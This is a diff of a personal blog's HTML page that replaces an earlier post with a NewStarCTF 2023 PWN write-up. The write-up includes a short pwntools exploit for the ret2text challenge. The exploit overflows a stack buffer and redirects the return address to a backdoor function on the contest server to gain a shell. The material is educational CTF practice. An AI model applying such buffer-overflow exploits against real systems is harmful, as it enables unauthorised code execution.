@@ -25,12 +25,12 @@
 
   
 
-<link rel="canonical" href="http://yanagi-kon.github.io/2023/09/19/WEB%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81/">
+<link rel="canonical" href="http://yanagi-kon.github.io/2023/10/05/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20PWN/">
 
 
 
   <title>
-WEB响应包源代码 |
+NewStarCTF 2023 公开赛道 PWN |
 Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
 <meta name="generator" content="Hexo 6.3.0"></head>
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -58,23 +58,23 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
         <div id="brand">
           <div class="pjax">
           
-  <h1 itemprop="name headline">WEB响应包源代码
+  <h1 itemprop="name headline">NewStarCTF 2023 公开赛道 PWN
   </h1>
   
 <div class="meta">
-  <span class="item" title="创建时间：2023-09-19 12:24:13">
+  <span class="item" title="创建时间：2023-10-05 17:06:00">
     <span class="icon">
       <i class="ic i-calendar"></i>
     </span>
     <span class="text">发表于</span>
-    <time itemprop="dateCreated datePublished" datetime="2023-09-19T12:24:13+08:00">2023-09-19</time>
+    <time itemprop="dateCreated datePublished" datetime="2023-10-05T17:06:00+08:00">2023-10-05</time>
   </span>
   <span class="item" title="本文字数">
     <span class="icon">
       <i class="ic i-pen"></i>
     </span>
     <span class="text">本文字数</span>
-    <span>39</span>
+    <span>525</span>
     <span class="text">字</span>
   </span>
   <span class="item" title="阅读时长">
@@ -115,12 +115,12 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclfdu6exj20zk0m87hw.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipeun65urj20zk0m81ii.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giph4baakhj20zk0m8h5q.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicitht3xtj20zk0m8k5v.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicli3sbvtj20zk0m8x6p.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipexoj0moj20zk0m8kgu.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giciusoyjnj219g0u0x56.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclh0m9pdj20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipexbei4hj20zk0m8npd.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicm07ih54j20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giph47e9vtj20zk0m8x6l.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclj61ylzj20zk0m8b29.jpg"></li>
         </ul>
       </div>
     </header>
@@ -149,7 +149,7 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
 </div>
 
     <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
-  <link itemprop="mainEntityOfPage" href="http://yanagi-kon.github.io/2023/09/19/WEB%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81/">
+  <link itemprop="mainEntityOfPage" href="http://yanagi-kon.github.io/2023/10/05/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20PWN/">
 
   <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="image" content="/images/avatar.jpg">
@@ -164,11 +164,15 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
   <div class="body md" itemprop="articleBody">
     
 
-    <h1 id="ctfhub-响应包源代码"><a class="markdownIt-Anchor" href="#ctfhub-响应包源代码">#</a> CTFHub | 响应包源代码</h1>
-<p>题目网页显示的内容如下：</p>
-<p><img data-src="test2.png" alt="test2"></p>
-<p>打开源代码就可以找到答案：</p>
-<p><img data-src="test1.png" alt="test1"></p>
+    <h2 id="newstarctf-2023-公开赛道-pwn"><a class="markdownIt-Anchor" href="#newstarctf-2023-公开赛道-pwn">#</a> NewStarCTF 2023 公开赛道 PWN</h2>
+<h3 id="ret2text"><a class="markdownIt-Anchor" href="#ret2text">#</a> ret2text</h3>
+<p><strong>考点：栈溢出，ret2txt</strong></p>
+<p>IDA 打开程序，找到主函数如下：</p>
+<p>![image-20231005150446089](NewStarCTF 2023 公开赛道 PWN/image-20231005150446089.png)</p>
+<p>发现是栈溢出类型的题目，在函数中也可以找到后门函数：</p>
+<p>![image-20231005150527611](NewStarCTF 2023 公开赛道 PWN/image-20231005150527611.png)</p>
+<p>利用 python 编写，直接填充字符覆盖返回地址为后门函数的地址即可</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25575</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"magic\n"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>backdoor <span class="token operator">=</span> <span class="token number">0x4011FB</span></pre></td></tr><tr><td data-num="5"></td><td><pre>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>  <span class="token comment">#p64 (0) 是为了覆盖掉 ebp</span></pre></td></tr><tr><td data-num="6"></td><td><pre>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>![image-20231005131606898](NewStarCTF 2023 公开赛道 PWN/image-20231005131606898.png)</p>
 
   </div>
 
@@ -180,7 +184,7 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2023-09-19 18:56:37" itemprop="dateModified" datetime="2023-09-19T18:56:37+08:00">2023-09-19</time>
+    <time title="修改时间：2023-10-05 17:00:38" itemprop="dateModified" datetime="2023-10-05T17:00:38+08:00">2023-10-05</time>
   </span>
 </div>
 
@@ -216,7 +220,7 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
   </li>
   <li class="link">
     <strong>本文链接：</strong>
-    <a href="http://yanagi-kon.github.io/2023/09/19/WEB%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81/" title="WEB响应包源代码">http://yanagi-kon.github.io/2023/09/19/WEB响应包源代码/</a>
+    <a href="http://yanagi-kon.github.io/2023/10/05/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20PWN/" title="NewStarCTF 2023 公开赛道 PWN">http://yanagi-kon.github.io/2023/10/05/NewStarCTF 2023 公开赛道 PWN/</a>
   </li>
   <li class="license">
     <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
@@ -235,20 +239,20 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
     <div class="item left">
       
 
-  <a href="/2023/09/18/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipevarprfj20zk0m8npd.jpg" title="我的第一篇博客">
+  <a href="/2023/10/04/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20WEB/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicis081o9j20zk0m8dmr.jpg" title="NewStarCTF 2023 公开赛道 WEB题目">
   <span class="type">上一篇</span>
   <span class="category"><i class="ic i-flag"></i> </span>
-  <h3>我的第一篇博客</h3>
+  <h3>NewStarCTF 2023 公开赛道 WEB题目</h3>
   </a>
 
     </div>
     <div class="item right">
       
 
-  <a href="/2023/09/19/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_2/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicm0fdw5cj20zk0m8hdt.jpg" title="斯坦福编程范式CS107_2">
+  <a href="/2023/10/05/IDA%20%E4%BD%BF%E7%94%A8/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclh5u05ej20zk0m87df.jpg" title="IDA 使用">
   <span class="type">下一篇</span>
   <span class="category"><i class="ic i-flag"></i> </span>
-  <h3>斯坦福编程范式CS107_2</h3>
+  <h3>IDA 使用</h3>
   </a>
 
     </div>
@@ -267,7 +271,7 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="文章目录">
-          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfhub-%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text"> CTFHub | 响应包源代码</span></a></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#newstarctf-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-pwn"><span class="toc-number">1.</span> <span class="toc-text"> NewStarCTF 2023 公开赛道 PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2text"><span class="toc-number">1.1.</span> <span class="toc-text"> ret2text</span></a></li></ol></li></ol>
       </div>
       <div class="related panel pjax" data-title="系列文章">
       </div>
@@ -334,12 +338,12 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
 
   <ul id="quick">
     <li class="prev pjax">
-        <a href="/2023/09/18/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+        <a href="/2023/10/04/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20WEB/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
     </li>
     <li class="up"><i class="ic i-arrow-up"></i></li>
     <li class="down"><i class="ic i-arrow-down"></i></li>
     <li class="next pjax">
-        <a href="/2023/09/19/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_2/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+        <a href="/2023/10/05/IDA%20%E4%BD%BF%E7%94%A8/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
     </li>
     <li class="percent"></li>
   </ul>
@@ -363,7 +367,7 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/09/18/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" title="我的第一篇博客">我的第一篇博客</a></span>
+    <span><a href="/2023/09/20/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" title="目录遍历">目录遍历</a></span>
   </li>
 
       
@@ -381,43 +385,7 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/10/05/IDA%20%E4%BD%BF%E7%94%A8/" title="IDA 使用">IDA 使用</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/10/01/BUUCTF%E2%80%94BABYRSA/" title="NewStarCTF 2023 公开赛道 Crypto题目">NewStarCTF 2023 公开赛道 Crypto题目</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
     <span><a href="/2023/09/19/WEB%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81/" title="WEB响应包源代码">WEB响应包源代码</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/10/02/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20MISC/" title="NewStarCTF 2023 公开赛道 MISC">NewStarCTF 2023 公开赛道 MISC</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/09/20/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" title="目录遍历">目录遍历</a></span>
   </li>
 
       
@@ -435,6 +403,24 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
 <div class="breadcrumb">
 </div>
 
+    <span><a href="/2023/10/05/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20PWN/" title="NewStarCTF 2023 公开赛道 PWN">NewStarCTF 2023 公开赛道 PWN</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/10/05/IDA%20%E4%BD%BF%E7%94%A8/" title="IDA 使用">IDA 使用</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
     <span><a href="/2023/09/18/hello-world/" title="Hello World">Hello World</a></span>
   </li>
 
@@ -444,7 +430,25 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/10/05/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20PWN/" title="NewStarCTF 2023 公开赛道 PWN">NewStarCTF 2023 公开赛道 PWN</a></span>
+    <span><a href="/2023/10/02/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20MISC/" title="NewStarCTF 2023 公开赛道 MISC">NewStarCTF 2023 公开赛道 MISC</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/09/18/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" title="我的第一篇博客">我的第一篇博客</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/10/01/BUUCTF%E2%80%94BABYRSA/" title="NewStarCTF 2023 公开赛道 Crypto题目">NewStarCTF 2023 公开赛道 Crypto题目</a></span>
   </li>
 
   </ul>
@@ -487,7 +491,7 @@ Yanagi's blog = 亚纳奇的Blog = 欸嘿！</title>
   </div>
 <script data-config type="text/javascript">
   var LOCAL = {
-    path: '2023/09/19/WEB响应包源代码/',
+    path: '2023/10/05/NewStarCTF 2023 公开赛道 PWN/',
     favicon: {
       show: "（●´3｀●）やれやれだぜ",
       hide: "(´Д｀)大変だ！"
